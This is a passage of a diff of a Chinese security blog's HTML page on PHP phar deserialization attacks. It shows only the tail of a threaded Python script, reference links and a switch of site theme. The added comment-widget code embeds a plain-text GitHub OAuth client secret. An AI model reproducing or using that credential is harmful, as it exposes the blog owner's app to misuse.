class="line"></span><br><span class="line">i &#x3D; 8</span><br><span class="line">pool &#x3D; ThreadPool( i )</span><br><span class="line">result &#x3D; pool.map_async( run, range(i) ).get(0xffff)</span><br></pre></td></tr></table></figure>
 
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.freebuf.com/column/198945.html" target="_blank" rel="noopener">PHP反序列化入门之phar</a><br><a href="https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017" target="_blank" rel="noopener">My-CTF-Web-Challenges</a><br><a href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">由phpggc理解php反序列化漏洞</a></p>
 
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a>
-                    
-                  </div>
-                
-              </div>
-              
-                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
-              
-              
-                <div class="post-prevnext row">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2019/05/28/2019ISCC-web%E9%A2%98%E8%A7%A3/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">2019ISCC_web题解</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2019/05/21/RCTF-nextphp%E9%A2%98%E8%A7%A3/">
-                        <span class="hidden-mobile">RCTF | nextphp题解</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-05-15T08:31:42.000Z" itemprop="dateUpdated">2020-05-15 16:31:42</time>
+</span><br>
+
+
+        
+        玩的开心
+        
+    </div>
+    
+    <footer>
+        <a href="http://zhzhdoai.github.io">
+            <img src="/img/avatar.jpg" alt="osword">
+            osword
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">PHP反序列化</a></li></ul>
+
 
             
-          </article>
-        </div>
-      </div>
-    </div>
+<div class="page-share-wrap">
     
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div id="tocbot"></div>
-</div>
 
-      </div>
-    
-  </div>
-</div>
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/&title=《PHP反序列化学习之phar攻击》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/&title=《PHP反序列化学习之phar攻击》 — osword's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《PHP反序列化学习之phar攻击》 — osword's blog&url=http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/&via=http://zhzhdoai.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
 
-<!-- Custom -->
 
 
-    
-  </main>
-
-  
-    <a id="scroll-top-button" href="#" role="button">
-      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
     </a>
-  
-
-  
-    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
 </div>
-  
 
-  
 
-  
 
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <div>
-      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
-      <i class="iconfont icon-love"></i>
-      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
-        <span>Fluid</span></a>
+        </div>
     </div>
+
     
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/05/28/2019ISCC-web%E9%A2%98%E8%A7%A3/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">2019ISCC_web题解</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/05/21/RCTF-nextphp%E9%A2%98%E8%A7%A3/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">RCTF | nextphp题解</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
 
     
 
-    
-  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script src="/js/md5.min.js"></script>
+    <script>
+        var gitalk = new Gitalk({
+            clientID: '7d7576c71632f14d639a',
+            clientSecret: '3d7f7e4c0e9a43a2cc5334d68aee612090df8b70',
+            repo: 'zhzhdoai.github.io',
+            owner: 'zhzhdoai',
+            admin: 'zhzhdoai',
+            id: md5(location.pathname),
+            perPage: 50,
+            distractionFreeMode: 'false'
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>osword &copy; 2015 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
 </footer>
 
-<!-- SCRIPTS -->
-<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
-<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
-<script  src="/js/debouncer.js" ></script>
-<script  src="/js/main.js" ></script>
-
-<!-- Plugins -->
-
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
 
 
 
-  
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/&title=《PHP反序列化学习之phar攻击》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/&title=《PHP反序列化学习之phar攻击》 — osword's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《PHP反序列化学习之phar攻击》 — osword's blog&url=http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/&via=http://zhzhdoai.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/" alt="微信分享二维码">
+</div>
 
 
 
-  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
-  <script  src="/js/clipboard-use.js" ></script>
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
 
 
 
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
 
 
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
-  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
-  <script>
-    $(document).ready(function () {
-      var boardCtn = $('#board-ctn');
-      var boardTop = boardCtn.offset().top;
 
-      tocbot.init({
-        tocSelector: '#tocbot',
-        contentSelector: '#post-body',
-        headingSelector: 'h1,h2,h3,h4,h5,h6',
-        linkClass: 'tocbot-link',
-        activeLinkClass: 'tocbot-active-link',
-        listClass: 'tocbot-list',
-        isCollapsedClass: 'tocbot-is-collapsed',
-        collapsibleClass: 'tocbot-is-collapsible',
-        collapseDepth: 0,
-        scrollSmooth: true,
-        headingsOffset: -boardTop
-      });
-      if ($('.toc-list-item').length > 0) {
-        $('#toc').css('visibility', 'visible');
-      }
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
     });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
-  <script>
-    var typed = new Typed('#subtitle', {
-      strings: [
-        '  ',
-        "PHP反序列化学习之phar攻击&nbsp;",
-      ],
-      cursorChar: "_",
-      typeSpeed: 70,
-      loop: false,
-    });
-    typed.stop();
-    $(document).ready(function () {
-      $(".typed-cursor").addClass("h2");
-      typed.start();
-    });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
-  <script>
-    anchors.options = {
-      placement: "right",
-      visible: "hover",
-      
-    };
-    var el = "h1,h2,h3,h4,h5,h6".split(",");
-    var res = [];
-    for (item of el) {
-      res.push(".markdown-body > " + item)
-    }
-    anchors.add(res.join(", "))
-  </script>
-
-
-
-  <script  src="/js/local-search.js" ></script>
-  <script>
-    var path = "/local-search.xml";
-    var inputArea = document.querySelector("#local-search-input");
-    inputArea.onclick = function () {
-      searchFunc(path, 'local-search-input', 'local-search-result');
-      this.onclick = null
-    }
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-  <script>
-    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
-      function () {
-        var element = document.createElement('a');
-        $(element).attr('data-fancybox', 'images');
-        $(element).attr('href', $(this).attr('src'));
-        $(this).wrap(element);
-      }
-    );
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+})();
+</script>
 
 
 
